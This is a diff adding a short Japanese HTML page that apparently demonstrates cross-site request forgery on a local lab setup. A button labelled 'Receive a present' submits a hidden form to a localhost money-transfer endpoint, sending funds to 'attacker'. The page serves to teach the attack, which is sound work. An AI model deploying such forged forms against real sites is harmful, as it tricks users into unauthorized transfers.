@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <title>知らないページ</title>
+</head>
+<body>
+  <h1>知らないページ（127.0.0.1:3001）</h1>
+  <!-- 押すと、3000番の送金のURLへフォームを送る -->
+  <form action="http://localhost:3000/transfer" method="post">
+    <input type="hidden" name="to" value="attacker">
+    <button>プレゼントを受け取る</button>
+  </form>
+</body>
+</html>
